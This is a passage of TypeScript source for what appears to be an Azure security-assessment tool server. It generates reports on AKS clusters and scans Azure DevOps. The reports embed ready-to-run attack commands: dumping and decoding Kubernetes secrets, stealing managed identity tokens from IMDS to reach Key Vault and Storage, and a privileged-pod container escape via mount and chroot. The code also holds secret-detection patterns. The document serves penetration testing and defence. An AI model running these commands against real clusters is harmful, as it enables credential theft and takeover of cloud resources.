          report += `## Offensive Usage Instructions\n\n`;
          report += `### 1. Save Kubeconfig\n\`\`\`bash\n`;
          report += `# Save the kubeconfig to file\n`;
          report += `cat > ~/aks-${clusterName}.kubeconfig <<'EOF'\n${kubeconfigContent}\nEOF\n\n`;
          report += `# Set KUBECONFIG environment variable\n`;
          report += `export KUBECONFIG=~/aks-${clusterName}.kubeconfig\n\`\`\`\n\n`;
          
          report += `### 2. Test Kubectl Access\n\`\`\`bash\n`;
          report += `# Verify cluster access\n`;
          report += `kubectl cluster-info\n`;
          report += `kubectl get nodes\n`;
          report += `kubectl get namespaces\n\n`;
          report += `# Check your permissions\n`;
          report += `kubectl auth can-i --list\n`;
          report += `kubectl auth can-i create pods\n`;
          report += `kubectl auth can-i get secrets --all-namespaces\n\`\`\`\n\n`;
          
          report += `### 3. RBAC Enumeration\n\`\`\`bash\n`;
          report += `# List all service accounts\n`;
          report += `kubectl get serviceaccounts --all-namespaces\n\n`;
          report += `# Find cluster-admin bindings\n`;
          report += `kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name=="cluster-admin")'\n\n`;
          report += `# List all roles and bindings\n`;
          report += `kubectl get clusterroles\n`;
          report += `kubectl get rolebindings --all-namespaces\n\`\`\`\n\n`;
          
          report += `### 4. Secret Extraction\n\`\`\`bash\n`;
          report += `# List all secrets\n`;
          report += `kubectl get secrets --all-namespaces\n\n`;
          report += `# Extract specific secret\n`;
          report += `kubectl get secret <SECRET_NAME> -n <NAMESPACE> -o jsonpath='{.data}' | jq -r 'to_entries[] | "\\(.key): \\(.value | @base64d)"'\n\n`;
          report += `# Find database credentials\n`;
          report += `kubectl get secrets --all-namespaces -o json | jq -r '.items[] | select(.metadata.name | contains("db"))'\n\`\`\`\n\n`;
          
          report += `### 5. Deploy Attack Pod (if you have create pod permission)\n\`\`\`bash\n`;
          report += `# Deploy privileged pod for IMDS access\n`;
          report += `kubectl run attack-pod --image=alpine --restart=Never --rm -it -- /bin/sh\n\n`;
          report += `# Inside pod, test IMDS access\n`;
          report += `apk add curl\n`;
          report += `curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"\n\n`;
          report += `# Get managed identity token\n`;
          report += `TOKEN=$(curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/")\n`;
          report += `echo $TOKEN | jq -r .access_token\n\`\`\`\n\n`;
          
          report += `## Security Findings\n`;
          if (!cluster.apiServerAccessProfile?.enablePrivateCluster) {
            report += `- [FAIL] **CRITICAL:** API server is PUBLIC - accessible from Internet\n`;
          }
          if (!cluster.enableRbac) {
            report += `- [FAIL] **CRITICAL:** RBAC is DISABLED - any authenticated user has cluster-admin\n`;
          }
          if (cluster.servicePrincipalProfile?.clientId && cluster.servicePrincipalProfile.clientId !== "msi") {
            report += `- [WARN] **HIGH:** Using Service Principal (consider migrating to Managed Identity)\n`;
          }
          if (!cluster.aadProfile?.managed) {
            report += `- [WARN] **MEDIUM:** Azure AD integration not enabled\n`;
          }

          return {
            content: [{ type: "text", text: report }],
          };
        } catch (error: any) {
          return {
            content: [{
              type: "text",
              text: `Error retrieving AKS credentials: ${error.message}\n\nEnsure you have the required permissions:\n- Azure Kubernetes Service Cluster User Role (for user creds)\n- Azure Kubernetes Service Cluster Admin Role (for admin creds)`
            }],
            isError: true,
          };
        }
      }

      case "enumerate_aks_identities": {
        const { subscriptionId, resourceGroup, clusterName } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup: string;
          clusterName: string;
        };

        const containerClient = new ContainerServiceClient(credential, subscriptionId);
        const authClient = new AuthorizationManagementClient(credential, subscriptionId);
        
        try {
          const cluster = await containerClient.managedClusters.get(resourceGroup, clusterName);
          
          let report = `# AKS Identity Enumeration - ${clusterName}\n\n`;
          
          // Cluster Identity
          report += `## Cluster Identity\n`;
          if (cluster.identity?.type === "SystemAssigned") {
            report += `- **Type:** System-Assigned Managed Identity\n`;
            report += `- **Principal ID:** ${cluster.identity.principalId}\n`;
            report += `- **Tenant ID:** ${cluster.identity.tenantId}\n\n`;
            
            // Get role assignments for this identity
            report += `### Role Assignments\n`;
            try {
              const roleAssignments = authClient.roleAssignments.listForScope(
                `/subscriptions/${subscriptionId}`
              );
              
              for await (const assignment of roleAssignments) {
                if (assignment.principalId === cluster.identity.principalId) {
                  report += `- **Scope:** ${assignment.scope}\n`;
                  report += `  **Role:** ${assignment.roleDefinitionId?.split('/').pop()}\n\n`;
                }
              }
            } catch (e: any) {
              report += `*Unable to enumerate role assignments: ${e.message}*\n\n`;
            }
          } else if (cluster.identity?.type === "UserAssigned") {
            report += `- **Type:** User-Assigned Managed Identity\n`;
            const identities = cluster.identity.userAssignedIdentities || {};
            for (const [identityId, identityInfo] of Object.entries(identities)) {
              report += `- **Identity Resource:** ${identityId}\n`;
              report += `  **Principal ID:** ${(identityInfo as any).principalId}\n`;
              report += `  **Client ID:** ${(identityInfo as any).clientId}\n\n`;
            }
          } else {
            report += `- **Type:** None (using Service Principal)\n\n`;
          }
          
          // Service Principal (if used)
          if (cluster.servicePrincipalProfile?.clientId) {
            report += `## Service Principal\n`;
            report += `- **Client ID:** ${cluster.servicePrincipalProfile.clientId}\n`;
            if (cluster.servicePrincipalProfile.clientId === "msi") {
              report += `- **Type:** Managed Service Identity (MSI)\n\n`;
            } else {
              report += `- **Type:** Standard Service Principal\n`;
              report += `- [WARN] **Security Risk:** Service principals use secrets that can be stolen\n\n`;
            }
          }
          
          // Kubelet Identity
          if (cluster.identityProfile?.kubeletidentity) {
            report += `## Kubelet Identity\n`;
            report += `- **Resource ID:** ${cluster.identityProfile.kubeletidentity.resourceId}\n`;
            report += `- **Client ID:** ${cluster.identityProfile.kubeletidentity.clientId}\n`;
            report += `- **Object ID:** ${cluster.identityProfile.kubeletidentity.objectId}\n\n`;
          }
          
          // Add-on identities
          if (cluster.addonProfiles) {
            report += `## Add-on Identities\n`;
            for (const [addonName, addonProfile] of Object.entries(cluster.addonProfiles)) {
              if ((addonProfile as any).identity) {
                report += `### ${addonName}\n`;
                report += `- **Resource ID:** ${(addonProfile as any).identity.resourceId}\n`;
                report += `- **Client ID:** ${(addonProfile as any).identity.clientId}\n`;
                report += `- **Object ID:** ${(addonProfile as any).identity.objectId}\n\n`;
              }
            }
          }
          
          report += `## Attack Surface Analysis\n\n`;
          report += `### IMDS Exploitation Risk\n`;
          report += `If pods can access Azure IMDS (169.254.169.254), they can:\n`;
          report += `1. Retrieve managed identity access tokens\n`;
          report += `2. Use tokens to access Azure resources (based on identity's RBAC)\n`;
          report += `3. Bypass Kubernetes RBAC entirely\n\n`;
          
          report += `### Test IMDS Access from Pod\n\`\`\`bash\n`;
          report += `# Deploy test pod\n`;
          report += `kubectl run imds-test --image=alpine --restart=Never --rm -it -- /bin/sh\n\n`;
          report += `# Inside pod:\n`;
          report += `apk add curl jq\n`;
          report += `TOKEN=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r .access_token)\n`;
          report += `echo $TOKEN\n\n`;
          report += `# Use token to list subscriptions\n`;
          report += `curl -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq\n\`\`\`\n\n`;
          
          report += `### Privilege Escalation Paths\n`;
          if (cluster.identity?.principalId) {
            report += `- If cluster identity has **Contributor** or **Owner** on subscription → Full Azure control from pods\n`;
            report += `- If kubelet identity has access to **Key Vault** → Extract secrets from pods\n`;
            report += `- If identity has **Storage Blob Data Contributor** → Read/Write storage from pods\n\n`;
          }
          
          report += `## Remediation\n`;
          report += `1. Use **AAD Pod Identity** or **Workload Identity** instead of cluster-wide managed identity\n`;
          report += `2. Block IMDS from pods using network policies or iptables\n`;
          report += `3. Implement **least privilege RBAC** for identities\n`;
          report += `4. Enable **Azure Policy** to restrict pod capabilities\n`;
          report += `5. Use **Pod Security Policies** or **Pod Security Standards**\n`;

          return {
            content: [{ type: "text", text: report }],
          };
        } catch (error: any) {
          return {
            content: [{
              type: "text",
              text: `Error enumerating AKS identities: ${error.message}`
            }],
            isError: true,
          };
        }
      }

      case "scan_aks_node_security": {
        const { subscriptionId, resourceGroup, clusterName } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup: string;
          clusterName: string;
        };

        const containerClient = new ContainerServiceClient(credential, subscriptionId);
        const computeClient = new ComputeManagementClient(credential, subscriptionId);
        
        try {
          const cluster = await containerClient.managedClusters.get(resourceGroup, clusterName);
          
          let report = `# AKS Node Security Scan - ${clusterName}\n\n`;
          
          // Get node resource group (where actual VMs are)
          const nodeResourceGroup = cluster.nodeResourceGroup || "";
          report += `## Node Resource Group\n`;
          report += `- **Name:** ${nodeResourceGroup}\n`;
          report += `- **Location:** ${cluster.location}\n\n`;
          
          // Analyze agent pools
          report += `## Node Pools\n\n`;
          const agentPools = cluster.agentPoolProfiles || [];
          
          for (const pool of agentPools) {
            report += `### ${pool.name}\n`;
            report += `- **VM Size:** ${pool.vmSize}\n`;
            report += `- **OS Type:** ${pool.osType}\n`;
            report += `- **OS SKU:** ${pool.osSKU}\n`;
            report += `- **Node Count:** ${pool.count}\n`;
            report += `- **Mode:** ${pool.mode}\n`;
            report += `- **Availability Zones:** ${pool.availabilityZones?.join(", ") || "None"}\n\n`;
            
            // Security findings
            report += `**Security Findings:**\n`;
            
            // Check OS disk encryption
            if (!pool.enableEncryptionAtHost) {
              report += `- [FAIL] **HIGH:** Host encryption NOT enabled - OS and temp disks not encrypted at rest\n`;
            } else {
              report += `- [OK] Host encryption enabled\n`;
            }
            
            // Check FIPS
            if (!pool.enableFips) {
              report += `- [WARN] **MEDIUM:** FIPS not enabled (required for compliance workloads)\n`;
            }
            
            // Check auto-upgrade
            if (pool.enableAutoScaling) {
              report += `- [OK] Auto-scaling enabled (${pool.minCount}-${pool.maxCount} nodes)\n`;
            } else {
              report += `- [WARN] **MEDIUM:** Auto-scaling disabled - manual scaling required\n`;
            }
            
            // Check ultra SSD
            if (pool.enableUltraSSD) {
              report += `- [INFO] Ultra SSD enabled\n`;
            }
            
            // Check node public IP
            if (pool.enableNodePublicIP) {
              report += `- [FAIL] **CRITICAL:** Nodes have PUBLIC IPs - direct Internet exposure\n`;
            } else {
              report += `- [OK] Nodes do not have public IPs\n`;
            }
            
            report += `\n`;
          }
          
          // Try to enumerate actual VMs in node resource group
          report += `## Node Virtual Machines\n\n`;
          try {
            const vms = computeClient.virtualMachines.list(nodeResourceGroup);
            let vmCount = 0;
            
            for await (const vm of vms) {
              vmCount++;
              report += `### VM: ${vm.name}\n`;
              
              // Check VM encryption
              if (vm.storageProfile?.osDisk?.encryptionSettings?.enabled) {
                report += `- [OK] OS Disk encrypted\n`;
              } else {
                report += `- [FAIL] **HIGH:** OS Disk NOT encrypted\n`;
              }
              
              // Check data disks
              const dataDisks = vm.storageProfile?.dataDisks || [];
              if (dataDisks.length > 0) {
                report += `- **Data Disks:** ${dataDisks.length}\n`;
                for (const disk of dataDisks) {
                  // Note: Disk encryption checked at disk resource level, not here
                  report += `  - ${disk.name} (${disk.diskSizeGB} GB)\n`;
                }
              }
              
              // Check VM extensions (security agents)
              if (vm.resources) {
                report += `- **Extensions:**\n`;
                for (const ext of vm.resources) {
                  report += `  - ${ext.type}: ${ext.name}\n`;
                }
              }
              
              report += `\n`;
            }
            
            if (vmCount === 0) {
              report += `*No VMs found or insufficient permissions*\n\n`;
            }
          } catch (e: any) {
            report += `*Unable to enumerate VMs: ${e.message}*\n\n`;
          }
          
          report += `## Attack Surface\n\n`;
          report += `### Container Escape Risk\n`;
          report += `If nodes lack proper security configuration:\n`;
          report += `1. Deploy privileged pod: \`kubectl run priv --image=alpine --restart=Never --overrides='{"spec":{"containers":[{"name":"priv","image":"alpine","securityContext":{"privileged":true}}],"hostNetwork":true,"hostPID":true}}' --rm -it -- /bin/sh\`\n`;
          report += `2. From privileged pod, access host filesystem: \`mount /dev/sda1 /mnt && chroot /mnt\`\n`;
          report += `3. Now on AKS node with root access\n`;
          report += `4. Read kubelet config: \`cat /var/lib/kubelet/kubeconfig\`\n`;
          report += `5. Access all cluster secrets and resources\n\n`;
          
          report += `### SSH Access (if enabled)\n`;
          report += `Some organizations enable SSH on AKS nodes for troubleshooting:\n`;
          report += `\`\`\`bash\n`;
          report += `# Find node IPs\n`;
          report += `kubectl get nodes -o wide\n\n`;
          report += `# Attempt SSH (if enabled and you have private key)\n`;
          report += `ssh azureuser@<NODE_IP>\n`;
          report += `\`\`\`\n\n`;
          
          report += `## Remediation\n`;
          report += `1. Enable **encryption at host** for all node pools\n`;
          report += `2. Disable **node public IPs** (use private cluster)\n`;
          report += `3. Implement **Pod Security Standards** to prevent privileged pods\n`;
          report += `4. Enable **auto-upgrade** for security patches\n`;
          report += `5. Use **Azure Defender for Containers** for runtime protection\n`;
          report += `6. Disable SSH access to nodes\n`;

          return {
            content: [{ type: "text", text: report }],
          };
        } catch (error: any) {
          return {
            content: [{
              type: "text",
              text: `Error scanning AKS nodes: ${error.message}`
            }],
            isError: true,
          };
        }
      }

      case "test_aks_imds_access": {
        const { subscriptionId, resourceGroup, clusterName } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup: string;
          clusterName: string;
        };

        const containerClient = new ContainerServiceClient(credential, subscriptionId);
        
        try {
          const cluster = await containerClient.managedClusters.get(resourceGroup, clusterName);
          
          let report = `# AKS IMDS Access Test - ${clusterName}\n\n`;
          
          report += `## Azure Instance Metadata Service (IMDS)\n`;
          report += `**Endpoint:** http://169.254.169.254\n`;
          report += `**Risk:** If accessible from pods, allows managed identity token theft\n\n`;
          
          report += `## Current Cluster Configuration\n`;
          report += `- **Private Cluster:** ${cluster.apiServerAccessProfile?.enablePrivateCluster ? "Yes" : "No"}\n`;
          report += `- **Network Plugin:** ${cluster.networkProfile?.networkPlugin}\n`;
          report += `- **Network Policy:** ${cluster.networkProfile?.networkPolicy || "None"}\n`;
          report += `- **Pod CIDR:** ${cluster.networkProfile?.podCidr || "N/A"}\n`;
          report += `- **Service CIDR:** ${cluster.networkProfile?.serviceCidr || "N/A"}\n\n`;
          
          report += `## IMDS Exploitation Test Procedure\n\n`;
          report += `### Step 1: Deploy Test Pod\n\`\`\`bash\n`;
          report += `kubectl run imds-test --image=alpine:latest --restart=Never --rm -it -- /bin/sh\n\`\`\`\n\n`;
          
          report += `### Step 2: Install curl (inside pod)\n\`\`\`bash\n`;
          report += `apk add --no-cache curl jq\n\`\`\`\n\n`;
          
          report += `### Step 3: Test IMDS Reachability\n\`\`\`bash\n`;
          report += `# Test basic connectivity\n`;
          report += `curl -v -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"\n\`\`\`\n\n`;
          
          report += `**Expected Results:**\n`;
          report += `- [OK] **If accessible:** JSON response with VM metadata -> IMDS is reachable (HIGH RISK)\n`;
          report += `- [FAIL] **If blocked:** Connection timeout/refused -> IMDS properly restricted\n\n`;
          
          report += `### Step 4: Extract Managed Identity Token (if IMDS accessible)\n\`\`\`bash\n`;
          report += `# Get token for Azure Resource Manager\n`;
          report += `TOKEN=$(curl -s -H "Metadata: true" \\\n`;
          report += `  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \\\n`;
          report += `  | jq -r .access_token)\n\n`;
          report += `echo "Token: $TOKEN"\n\n`;
          report += `# Decode token to see identity\n`;
          report += `echo $TOKEN | cut -d'.' -f2 | base64 -d | jq\n\`\`\`\n\n`;
          
          report += `### Step 5: Use Token to Access Azure Resources\n\`\`\`bash\n`;
          report += `# List subscriptions\n`;
          report += `curl -H "Authorization: Bearer $TOKEN" \\\n`;
          report += `  "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq\n\n`;
          report += `# Get token for Key Vault\n`;
          report += `KV_TOKEN=$(curl -s -H "Metadata: true" \\\n`;
          report += `  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \\\n`;
          report += `  | jq -r .access_token)\n\n`;
          report += `# Access Key Vault secret\n`;
          report += `curl -H "Authorization: Bearer $KV_TOKEN" \\\n`;
          report += `  "https://<VAULT_NAME>.vault.azure.net/secrets/<SECRET_NAME>?api-version=7.2" | jq\n\n`;
          report += `# Get token for Storage\n`;
          report += `STORAGE_TOKEN=$(curl -s -H "Metadata: true" \\\n`;
          report += `  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" \\\n`;
          report += `  | jq -r .access_token)\n\n`;
          report += `# List storage blobs\n`;
          report += `curl -H "Authorization: Bearer $STORAGE_TOKEN" \\\n`;
          report += `  -H "x-ms-version: 2020-04-08" \\\n`;
          report += `  "https://<STORAGE_ACCOUNT>.blob.core.windows.net/<CONTAINER>?restype=container&comp=list"\n\`\`\`\n\n`;
          
          report += `## Risk Assessment\n\n`;
          
          if (!cluster.networkProfile?.networkPolicy) {
            report += `### [FAIL] CRITICAL: No Network Policy Configured\n`;
            report += `- Pods can freely access IMDS endpoint\n`;
            report += `- Any compromised pod = instant managed identity token theft\n`;
            report += `- Attacker can access Azure resources based on identity's RBAC\n\n`;
          } else {
            report += `### [OK] Network Policy Enabled: ${cluster.networkProfile.networkPolicy}\n`;
            report += `- Network policies can restrict IMDS access\n`;
            report += `- **Must verify** that policies actually block 169.254.169.254\n\n`;
          }
          
          report += `## Attack Scenario\n\n`;
          report += `1. **Entry Point:** Attacker gains code execution in pod (e.g., via vulnerable app)\n`;
          report += `2. **IMDS Access:** From pod, access http://169.254.169.254 to get managed identity token\n`;
          report += `3. **Token Theft:** Extract OAuth token for Azure resources\n`;
          report += `4. **Privilege Escalation:** Use token to access Azure resources\n`;
          report += `5. **Impact:** Based on cluster identity's RBAC permissions:\n`;
          report += `   - **Contributor/Owner** → Full subscription control\n`;
          report += `   - **Key Vault access** → Extract all secrets\n`;
          report += `   - **Storage access** → Read/modify production data\n`;
          report += `   - **VM access** → Lateral movement to other VMs\n\n`;
          
          report += `## Remediation Strategies\n\n`;
          report += `### Option 1: Block IMDS with Network Policy\n\`\`\`yaml\n`;
          report += `apiVersion: networking.k8s.io/v1\n`;
          report += `kind: NetworkPolicy\n`;
          report += `metadata:\n`;
          report += `  name: block-imds\n`;
          report += `  namespace: default\n`;
          report += `spec:\n`;
          report += `  podSelector: {}\n`;
          report += `  policyTypes:\n`;
          report += `  - Egress\n`;
          report += `  egress:\n`;
          report += `  - to:\n`;
          report += `    - ipBlock:\n`;
          report += `        cidr: 0.0.0.0/0\n`;
          report += `        except:\n`;
          report += `        - 169.254.169.254/32\n`;
          report += `\`\`\`\n\n`;
          
          report += `### Option 2: Use Workload Identity (Recommended)\n`;
          report += `- Replaces cluster-wide managed identity with per-pod identities\n`;
          report += `- Enable: \`az aks update --enable-workload-identity\`\n`;
          report += `- Pods get tokens via Kubernetes service account projection, not IMDS\n`;
          report += `- Provides better isolation and least privilege\n\n`;
          
          report += `### Option 3: AAD Pod Identity (Legacy)\n`;
          report += `- Similar to Workload Identity but older implementation\n`;
          report += `- Uses MIC (Managed Identity Controller) to intercept IMDS\n`;
          report += `- Being replaced by Workload Identity\n\n`;
          
          report += `### Option 4: Restrict Cluster Identity RBAC\n`;
          report += `- Reduce cluster managed identity permissions to minimum\n`;
          report += `- Use **Reader** instead of **Contributor**\n`;
          report += `- Grant specific resource access via separate managed identities\n\n`;
          
          report += `## Verification Commands\n\n`;
          report += `\`\`\`bash\n`;
          report += `# Check if workload identity enabled\n`;
          report += `az aks show --resource-group ${resourceGroup} --name ${clusterName} --query "oidcIssuerProfile.enabled"\n\n`;
          report += `# Check network policies\n`;
          report += `kubectl get networkpolicies --all-namespaces\n\n`;
          report += `# Test IMDS from pod (should fail if blocked)\n`;
          report += `kubectl run test --image=alpine --restart=Never --rm -it -- sh -c "apk add curl; curl -m 5 http://169.254.169.254"\n`;
          report += `\`\`\`\n`;

          return {
            content: [{ type: "text", text: report }],
          };
        } catch (error: any) {
          return {
            content: [{
              type: "text",
              text: `Error testing IMDS access: ${error.message}`
            }],
            isError: true,
          };
        }
      }

      case "scan_azure_devops": {
        const { organizationUrl, personalAccessToken, scanRepositories, scanPipelines } = request.params.arguments as {
          organizationUrl: string;
          personalAccessToken: string;
          scanRepositories?: boolean;
          scanPipelines?: boolean;
        };

        const doScanRepos = scanRepositories !== false;
        const doScanPipelines = scanPipelines !== false;

        try {
          const authHandler = azdev.getPersonalAccessTokenHandler(personalAccessToken);
          const connection = new azdev.WebApi(organizationUrl, authHandler);

          let report = `# Azure DevOps Security Scan\n\n`;
          report += `**Organization:** ${organizationUrl}\n`;
          report += `**Scan Date:** ${new Date().toISOString()}\n\n`;

          const findings: any[] = [];
          let criticalCount = 0;
          let highCount = 0;
          let mediumCount = 0;

          // Get core API
          const coreApi = await connection.getCoreApi();
          const projects = await coreApi.getProjects();

          report += `## Projects Found: ${projects.length}\n\n`;

          for (const project of projects) {
            report += `### Project: ${project.name}\n\n`;

            // Scan repositories for secrets
            if (doScanRepos) {
              try {
                const gitApi = await connection.getGitApi();
                const repositories = await gitApi.getRepositories(project.id!);

                report += `**Repositories:** ${repositories.length}\n\n`;

                for (const repo of repositories) {
                  // Get repository files (limited to avoid huge scans)
                  try {
                    const items = await gitApi.getItems(
                      repo.id!,
                      project.id,
                      undefined,
                      undefined,
                      undefined,
                      false,
                      false,
                      false,
                      undefined
                    );

                    // Check for common secret patterns in file names
                    const sensitivePatterns = [
                      '.env',
                      'secrets',
                      'password',
                      'config.json',
                      'appsettings.json',
                      'credentials',
                      '.pem',
                      '.key',
                      'id_rsa',
                    ];

                    for (const item of items) {
                      const fileName = item.path?.toLowerCase() || '';
                      const hasSensitivePattern = sensitivePatterns.some(pattern =>
                        fileName.includes(pattern)
                      );

                      if (hasSensitivePattern) {
                        findings.push({
                          severity: 'HIGH',
                          category: 'Repository',
                          resource: `${repo.name}`,
                          finding: `Potentially sensitive file: ${item.path}`,
                          remediation: 'Review file contents for hardcoded secrets',
                        });
                        highCount++;
                        report += `- [WARN] **HIGH**: Sensitive file found: ${item.path}\n`;
                      }
                    }
                  } catch (e: any) {
                    // Skip if can't access repo items
                  }
                }
              } catch (e: any) {
                report += `*Unable to scan repositories: ${e.message}*\n\n`;
              }
            }

            // Scan build pipelines
            if (doScanPipelines) {
              try {
                const buildApi = await connection.getBuildApi();
                const definitions = await buildApi.getDefinitions(project.id!);

                report += `**Build Pipelines:** ${definitions.length}\n\n`;

                for (const definition of definitions) {
                  const fullDef = await buildApi.getDefinition(project.id!, definition.id!);

                  // Check for inline scripts that might contain secrets
                  const defJson = JSON.stringify(fullDef);

                  // Check for hardcoded patterns
                  const secretPatterns = [
                    { pattern: /password\s*[:=]\s*['"][^'"]+['"]/gi, severity: 'CRITICAL', name: 'Hardcoded password' },
                    { pattern: /connectionString\s*[:=]\s*['"][^'"]+['"]/gi, severity: 'CRITICAL', name: 'Connection string' },
                    { pattern: /apiKey\s*[:=]\s*['"][^'"]+['"]/gi, severity: 'CRITICAL', name: 'API key' },
                    { pattern: /secret\s*[:=]\s*['"][^'"]+['"]/gi, severity: 'HIGH', name: 'Secret value' },
                    { pattern: /token\s*[:=]\s*['"][^'"]+['"]/gi, severity: 'HIGH', name: 'Token' },
                  ];

                  for (const { pattern, severity, name } of secretPatterns) {
                    const matches = defJson.match(pattern);
                    if (matches && matches.length > 0) {
                      findings.push({
                        severity,
                        category: 'Pipeline',
                        resource: definition.name,
                        finding: `${name} detected in pipeline definition`,
                        remediation: 'Use Azure Key Vault or pipeline variables instead',
                      });

                      if (severity === 'CRITICAL') criticalCount++;
                      else if (severity === 'HIGH') highCount++;

                      report += `- [FAIL] **${severity}**: ${name} found in pipeline "${definition.name}"\n`;
                    }
                  }

                  // Check for service connections
                  if (fullDef.process && (fullDef.process as any).type === 2) {
                    // YAML pipeline
                    report += `  - Pipeline type: YAML\n`;
                  }
                }
              } catch (e: any) {
                report += `*Unable to scan pipelines: ${e.message}*\n\n`;
              }
            }

            // Scan service connections
            try {
              // Note: Service connection APIs require specific permissions
              report += `**Service Connections:** (Requires Service Endpoints Read permission)\n\n`;
              
              // Commenting out due to API method availability
              /*
              const taskApi = await connection.getTaskAgentApi();
              const endpoints = await taskApi.getServiceEndpoints(project.id!);

              report += `**Service Connections:** ${endpoints?.length || 0}\n\n`;

              for (const endpoint of endpoints || []) {
                // Check for insecure authentication
                if (endpoint.authorization?.scheme === 'UsernamePassword') {
                  findings.push({
                    severity: 'HIGH',
                    category: 'Service Connection',
                    resource: endpoint.name,
                    finding: 'Uses username/password authentication (not managed identity)',
                    remediation: 'Migrate to service principal or managed identity',
                  });
                  highCount++;
                  report += `- [WARN] **HIGH**: Service connection "${endpoint.name}" uses username/password auth\n`;
                }

                // Check for overly broad permissions
                if (endpoint.isReady === false) {
                  findings.push({
                    severity: 'MEDIUM',
                    category: 'Service Connection',
                    resource: endpoint.name,
                    finding: 'Service connection not ready/configured',
                    remediation: 'Remove unused service connections',
                  });
                  mediumCount++;
                }
              }
              */
            } catch (e: any) {
              report += `*Unable to scan service connections: ${e.message}*\n\n`;
            }

            report += `\n`;
          }

          report += `## Summary\n\n`;
          report += `- **Total Findings:** ${findings.length}\n`;
          report += `- [CRITICAL] **CRITICAL:** ${criticalCount}\n`;
          report += `- [HIGH] **HIGH:** ${highCount}\n`;
          report += `- [MEDIUM] **MEDIUM:** ${mediumCount}\n\n`;

          report += `## Security Recommendations\n\n`;
          report += `### Immediate Actions\n`;
          report += `1. Remove all hardcoded secrets from pipeline definitions\n`;
          report += `2. Use Azure Key Vault for sensitive values\n`;
          report += `3. Implement secret scanning in CI/CD\n`;
          report += `4. Review and rotate compromised credentials\n\n`;

          report += `### Best Practices\n`;
          report += `1. Use managed identities for service connections\n`;
          report += `2. Store secrets in Azure Key Vault\n`;
          report += `3. Reference Key Vault secrets in pipelines: \`$(KeyVaultSecret)\`\n`;
          report += `4. Enable branch policies to require code reviews\n`;
          report += `5. Use .gitignore to prevent committing sensitive files\n`;
          report += `6. Implement pre-commit hooks for secret scanning\n`;
          report += `7. Rotate PAT tokens regularly\n`;
          report += `8. Use least-privilege service principals\n\n`;

          report += `## Tools for Secret Detection\n`;
          report += `- **GitLeaks:** Scan repos for leaked secrets\n`;
          report += `- **TruffleHog:** Find high-entropy strings (keys/tokens)\n`;
          report += `- **Azure DevOps Credential Scanner:** Built-in scanning\n`;
          report += `- **GitHub Advanced Security:** Secret scanning integration\n\n`;

          return {
            content: [{ type: 'text', text: report }],
          };
        } catch (error: any) {
          return {
            content: [
              {
                type: 'text',
                text: `Error scanning Azure DevOps: ${error.message}\n\nCommon issues:\n- Invalid PAT token\n- Insufficient permissions (need Code:Read, Build:Read)\n- Wrong organization URL format\n- Network connectivity`,
              },
            ],
            isError: true,
          };
        }
      }

      // ========== NEW SECURITY TOOLS ==========
      case "analyze_function_apps": {
        const { subscriptionId, resourceGroup } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
        };
        
        try {
          const credential = new DefaultAzureCredential();
          let report = `# Azure Functions Security Analysis\n\n`;
          report += `**Subscription:** ${subscriptionId}\n`;
          report += `**Scan Date:** ${new Date().toISOString()}\n\n`;
          
          // Note: Would need @azure/arm-appservice for full implementation
          report += `## Function App Security Checklist\n\n`;
          report += `### Authentication & Authorization\n`;
          report += `- [ ] App Service Authentication enabled\n`;
          report += `- [ ] HTTPS Only enforced\n`;
          report += `- [ ] Minimum TLS 1.2\n`;
          report += `- [ ] Managed Identity configured\n\n`;
          
          report += `### Network Security\n`;
          report += `- [ ] VNet Integration enabled\n`;
          report += `- [ ] Private Endpoints configured\n`;
          report += `- [ ] IP Restrictions set\n`;
          report += `- [ ] CORS properly configured\n\n`;
          
          report += `### Secrets Management\n`;
          report += `- [ ] No secrets in App Settings\n`;
          report += `- [ ] Key Vault references used\n`;
          report += `- [ ] Function keys rotated regularly\n\n`;
          
          report += `### Runtime Security\n`;
          report += `- [ ] Latest runtime version\n`;
          report += `- [ ] Remote debugging disabled\n`;
          report += `- [ ] FTP disabled\n`;
          report += `- [ ] Diagnostic logs enabled\n\n`;
          
          report += `## Common Attack Vectors\n\n`;
          report += `| Attack | Risk | Description |\n`;
          report += `|--------|------|-------------|\n`;
          report += `| Exposed Function URL | HIGH | Functions without auth exposed to internet |\n`;
          report += `| Leaked Function Keys | CRITICAL | Keys in source code or logs |\n`;
          report += `| SSRF via Managed Identity | HIGH | Function can access other Azure resources |\n`;
          report += `| Environment Variable Leak | MEDIUM | Secrets in app settings visible to anyone with access |\n`;
          
          return {
            content: [{ type: 'text', text: report }],
          };
        } catch (error: any) {
          return {
            content: [{ type: 'text', text: `Error analyzing Function Apps: ${error.message}` }],
            isError: true,
          };
        }
      }

      case "analyze_app_service_security": {
        const { subscriptionId, resourceGroup } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
        };
        
        try {
          let report = `# App Service Security Analysis\n\n`;
          report += `**Subscription:** ${subscriptionId}\n`;
          report += `**Scan Date:** ${new Date().toISOString()}\n\n`;
          
          report += `## Security Configuration Checklist\n\n`;
          report += `### Transport Security\n`;
          report += `- [ ] HTTPS Only enabled\n`;
          report += `- [ ] Minimum TLS Version: 1.2+\n`;
          report += `- [ ] HTTP/2 enabled\n`;
          report += `- [ ] Custom domain with managed certificate\n\n`;
          
          report += `### Authentication\n`;
          report += `- [ ] App Service Authentication (EasyAuth) configured\n`;
          report += `- [ ] Azure AD authentication\n`;
          report += `- [ ] Anonymous access blocked where appropriate\n\n`;
          
          report += `### Network Security\n`;
          report += `- [ ] VNet Integration enabled\n`;
          report += `- [ ] Private Endpoints for backend access\n`;
